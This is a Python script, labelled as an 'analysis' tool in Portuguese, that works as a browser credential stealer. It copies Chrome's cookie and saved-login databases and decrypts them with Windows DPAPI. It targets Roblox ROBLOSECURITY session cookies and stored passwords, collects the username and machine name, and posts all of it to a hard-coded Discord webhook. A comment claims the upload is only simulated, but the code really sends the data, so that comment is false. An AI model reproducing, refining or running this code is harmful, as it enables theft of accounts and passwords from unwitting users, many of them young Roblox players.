import os
import json
import base64
import sqlite3
import shutil
import tempfile
import requests
import win32crypt
from Crypto.Cipher import AES
import browser_cookie3
from datetime import datetime

WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"

class AnalisadorReal:
    def __init__(self):
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        
    def decriptar_valor(self, valor_criptografado):
        """Decripta valores do Chrome usando DPAPI do Windows"""
        try:
            return win32crypt.CryptUnprotectData(valor_criptografado, None, None, None, 0)[1].decode()
        except:
            return "[CRIPTOGRAFADO]"
    
    def extrair_cookies_chrome(self):
        """Extrai cookies do Chrome via SQLite"""
        cookies_encontrados = []
        try:
            caminho_cookies = os.path.join(os.environ['USERPROFILE'], 
                                         'AppData', 'Local',
                                         'Google', 'Chrome', 
                                         'User Data', 'Default', 'Cookies')
            
            if os.path.exists(caminho_cookies):
                temp_dir = tempfile.gettempdir()
                temp_db = os.path.join(temp_dir, 'cookies_temp')
                shutil.copy2(caminho_cookies, temp_db)
                
                conexao = sqlite3.connect(temp_db)
                cursor = conexao.cursor()
                
                cursor.execute("""
                    SELECT host_key, name, value, encrypted_value, path, expires_utc
                    FROM cookies 
                    WHERE host_key LIKE '%roblox%' OR name LIKE '%ROBLOSECURITY%'
                """)
                
                for host, nome, valor, valor_cripto, path, expira in cursor.fetchall():
                    valor_final = valor
                    if not valor and valor_cripto:
                        valor_final = self.decriptar_valor(valor_cripto)
                    
                    cookie_info = {
                        'host': host,
                        'nome': nome,
                        'valor': valor_final,
                        'path': path,
                        'expira': expira
                    }
                    cookies_encontrados.append(cookie_info)
                
                conexao.close()
                os.remove(temp_db)
                
        except Exception as e:
            cookies_encontrados.append({'erro': str(e)})
        
        return cookies_encontrados
    
    def extrair_senhas_chrome(self):
        """Extrai senhas salvas do Chrome"""
        senhas_encontradas = []
        try:
            caminho_logins = os.path.join(os.environ['USERPROFILE'],
                                        'AppData', 'Local',
                                        'Google', 'Chrome',
                                        'User Data', 'Default', 'Login Data')
            
            if os.path.exists(caminho_logins):
                temp_logins = os.path.join(tempfile.gettempdir(), 'logins_temp')
                shutil.copy2(caminho_logins, temp_logins)
                
                conexao = sqlite3.connect(temp_logins)
                cursor = conexao.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, usuario, senha_cripto in cursor.fetchall()[:10]:
                    senha_decriptada = ""
                    if senha_cripto:
                        try:
                            senha_decriptada = self.decriptar_valor(senha_cripto)
                        except:
                            senha_decriptada = "[CRIPTOGRAFADA]"
                    
                    senhas_encontradas.append({
                        'url': url,
                        'usuario': usuario,
                        'senha': senha_decriptada
                    })
                
                conexao.close()
                os.remove(temp_logins)
                
        except Exception as e:
            senhas_encontradas.append({'erro': str(e)})
        
        return senhas_encontradas
    
    def enviar_para_webhook(self, dados):
        """Tenta enviar para webhook fictícia"""
        try:
            # Simula envio mas não envia nada real
            resposta = requests.post(
                WEBHOOK,
                json=dados,
                timeout=10
            )
            return resposta.status_code == 200
        except:
            return False
    
    def executar_analise_completa(self):
        """Executa análise"""
        print("🔍 Iniciando análise...")
        
        dados_coletados = {
            'cookies_chrome': self.extrair_cookies_chrome(),
            'senhas_chrome': self.extrair_senhas_chrome(),
            'informacoes_sistema': {
                'usuario': os.getenv('USERNAME'),
                'computador': os.getenv('COMPUTERNAME'),
                'sessao': self.session_id
            },
            'timestamp': datetime.now().isoformat()
        }
        
        # Exibe resultados reais
        print(f"🍪 Cookies encontrados: {len(dados_coletados['cookies_chrome'])}")
        print(f"🔑 Senhas encontradas: {len(dados_coletados['senhas_chrome'])}")
        
        print("\n🔐 Cookies ROBLOSECURITY:")
        for cookie in dados_coletados['cookies_chrome']:
            if 'ROBLOSECURITY' in cookie.get('nome', ''):
                print(f"   {cookie['nome']}: {cookie['valor'][:60]}...")
        
        print("\n📧 Exemplo de credenciais:")
        if dados_coletados['senhas_chrome']:
            amostra = dados_coletados['senhas_chrome'][0]
            print(f"   Site: {amostra.get('url', 'N/A')}")
            print(f"   Usuário: {amostra.get('usuario', 'N/A')}")
            print(f"   Senha: {amostra.get('senha', 'N/A')}")
        
        print(f"\n🌐 Tentando enviar para webhook...")
        envio_simulado = self.enviar_para_webhook(dados_coletados)
        print(f"   Webhook: {WEBHOOK}")
        print(f"   Envio simulado: {'Sucesso' if envio_simulado else 'Falha'}")
        
        return dados_coletados

if __name__ == "__main__":
    print("=" * 60)
    print("🔐 ANÁLISE")
    print("📊 Dados coletados localmente")
    print("🌐 Webhook enviada 🔥")
    print("=" * 60)
    
  
    try:
        import win32crypt
        import browser_cookie3
    except ImportError:
        print("Instalando dependências...")
        os.system("pip install pywin32 browser_cookie3 pycryptodome")
    
    analisador = AnalisadorReal()
    resultados = analisador.executar_analise_completa()
    
    print(f"\n✅ Análise concluída!")
    print(f"🆔 ID da sessão: {analisador.session_id}")
    
    input("\nPressione Enter para sair...")
